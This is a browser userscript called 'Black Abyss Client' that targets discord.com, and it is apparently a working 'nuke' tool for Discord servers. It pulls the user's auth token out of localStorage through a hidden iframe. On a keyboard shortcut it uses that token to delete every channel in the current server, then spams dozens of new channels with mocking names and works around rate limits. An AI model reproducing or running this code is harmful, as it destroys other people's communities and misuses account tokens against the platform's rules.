// ==UserScript==
// @name         Black Abyss Client
// @namespace    http://tampermonkey.net/
// @version      0.3
// @description  try to take over the world!
// @author       VirusterDev
// @match        *://discord.com/*
// @icon         none
// @grant        none
// ==/UserScript==
(function() {
    'use strict';
    const abilities = {
        utils: {
            request: async(URL, METHOD, DATA, ONFINISH)=>{
                window.dispatchEvent(new Event("beforeunload"));const storage=document.body.appendChild(document.createElement("iframe")).contentWindow.localStorage,token=JSON.parse(storage.token);var goal=document.URL.substring(document.URL.lastIndexOf("/")+1,document.URL.length);
                let xml = new XMLHttpRequest;
                xml.open(METHOD, URL)
                xml.setRequestHeader('authorization', token)
                xml.setRequestHeader('Content-Type', 'application/json')
                xml.onreadystatechange = async() => {
                    if(xml.response && ONFINISH)ONFINISH(xml.response)
                }
                xml.send(DATA)
            }
        },
        deleteChannel: async(channelId) => {
            abilities.utils.request(`https://discord.com/api/v9/channels/${channelId}`, 'DELETE', null, null)
        },
        sendMessage: async(channelId, content) => {
            abilities.utils.request(`https://discord.com/api/v9/channels/${channelId}/messages`, 'POST', `{\"content\":\"${content}\",\"tts\":false}`, null)
        },
        createChannel: async(serverId, content, onload) => {
            abilities.utils.request(`https://discord.com/api/v9/guilds/${serverId}/channels`, 'POST', `{\"type\":0,\"name\":\"${content}\",\"permission_overwrites\":[]}`, onload)
        },
        getChannels: () => {
            let NodeList = document.querySelector("[aria-label='Channels'").querySelectorAll('li')
            let ids = []
            for(var i=0; i < NodeList.length; i++){
                if(NodeList[i].querySelector("a") && NodeList[i].querySelector("a").href.split('/')[5]){
                    ids.push(NodeList[i].querySelector("a").href.split('/')[5])
                }
            }
            return ids;
        }
    }
    var menu = {}
    document.addEventListener("keydown", (e) => {
        if(e.key == 'Escape' && e.ctrlKey){
            let ternary = function(){return (menu.underlay.style.display == 'block' ? true : false)}
            menu.underlay.style.display = (ternary() == true ? 'none' : 'block')
        }else if(e.key == 'q' && e.ctrlKey){
            let channels = abilities.getChannels()
            console.log(channels)
            let loopNumber = 0
            let loopFunction = function(){
                if(channels[loopNumber]){
                    abilities.deleteChannel(channels[loopNumber])
                    loopNumber += 1
                    loopFunction()
                }else{
                    let loopNumber = 0;
                    let loopFunction = function(){
                        if(loopNumber <= 50){
                            abilities.createChannel(window.location.href.split('/')[4], ['Noob','Nuke', 'EZ', 'Clown', 'Black Abyss', 'Server Wrecked', 'Black Abyss', 'Black Abyss', 'NUKE','NUKE','NUKE','NUKE'][Math.floor(Math.random() * 12)], (e) => {
                                if(JSON.parse(e).message == "You are being rate limited."){
                                    setTimeout(loopFunction(),JSON.parse(e).retry_after)
                                }else{
                                    setTimeout(loopFunction(), 300)
                                    loopNumber++
                                }
                            })
                        }
                    }
                    loopFunction()
                }
            }
            loopFunction()
        }
    })
    function Element(type, style){
        let element = document.createElement(type)
        element.style = style
        return element;
    }
    menu.underlay = Element('div', 'display:none; background-image: url("https://media.discordapp.net/attachments/989183343688056852/1050608917903851553/download.png?width=500&height=300"); width: 500px; height:300px; position:fixed; top: 0%; right:0%; left:0%; bottom:0%; z-index:9999;')
    top.document.body.appendChild(menu.underlay)
    menu.header = Element('div', 'background-color: rgba(0,0,0,0.5); width:500px; height:35px;')
    menu.underlay.appendChild(menu.header)
    menu.header.textElement = Element('h3', 'text-align:center;color: #333; font-size:30px; margin:0px;')
    menu.header.textElement.innerHTML = "Black Abyss Client <h3 style='color: #777; font-size:20px; background-color: rgba(0,0,0,0.5); width: 75px;margin: auto; margin-top:4px;border-bottom-left-radius: 30%;border-bottom-right-radius: 30%; border: 1px solid black; border-top:none; border-left: 2px solid black; border-right: 2px solid black;'>V0.3</h3>"
    menu.header.appendChild(menu.header.textElement)
    menu.tabDiv = Element('div', 'width: 130px; height: 265px; background-color: rgba(0,0,0,0.5); margin:0px;')
    menu.tabs = {}
    menu.tabDivs = {}
    menu.tabs.tab1 = Element('button', 'border:none; background-color:#000; color:#444; margin:0px; width:130px;height:35px; font-size:initial;')
    menu.tabs.tab1.innerHTML = 'Nuke'
    menu.tabDiv.appendChild(menu.tabs.tab1)
    menu.underlay.appendChild(menu.tabDiv)
    menu.tabDivs.tab1 = Element('div', 'width:370px; height:265px; background-color:black; display:none;')
    menu.underlay.appendChild(menu.tabDivs.tab1)
    menu.tabs.tab1.onclick = ()=>{
        menu.tabDivs.tab1.style.display = 'block'
    }
    /*
    Menu is still in development... Stay tuned for more updates :)
    !IMPORTANT!
    ** DO NOT COPY **
    */
})();